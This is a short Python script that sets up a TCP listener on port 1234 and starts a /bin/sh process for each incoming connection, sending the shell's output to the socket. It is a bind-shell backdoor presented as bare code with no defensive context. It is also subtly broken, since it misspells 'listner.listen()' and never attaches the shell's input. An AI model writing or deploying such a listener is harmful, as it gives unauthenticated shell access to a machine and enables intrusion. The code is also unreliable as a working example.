import socket
import subprocess

# Create a new TCP listener on port 1234
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("localhost", 1234))
listner.listen()

# Accept incoming connections in a loop
while True:
    # Accept the next incoming connection
    conn, addr = listener.accept()

    # Start a shell and redirect its output to the connected socket
    proc = subprocess.Popen(["/bin/sh"], stdout=conn, stderr=conn)

    # Wait for the shell to finish
    proc.wait()
